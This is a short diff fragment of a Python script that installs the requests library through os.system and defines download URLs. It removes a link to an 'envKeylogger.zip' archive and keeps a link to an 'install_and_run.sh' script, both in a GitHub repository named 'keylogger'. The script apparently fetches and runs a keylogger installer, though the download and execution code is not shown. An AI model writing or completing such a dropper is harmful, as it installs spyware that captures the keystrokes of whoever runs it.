@@ -3,7 +3,6 @@ os.system('pip install requests')
 
 import requests
 
-urlZip = 'https://github.com/ELREBEU/keylogger/raw/refs/heads/main/envKeylogger.zip'
 
 url = 'https://raw.githubusercontent.com/ELREBEU/keylogger/refs/heads/main/install_and_run/install_and_run.sh'
 
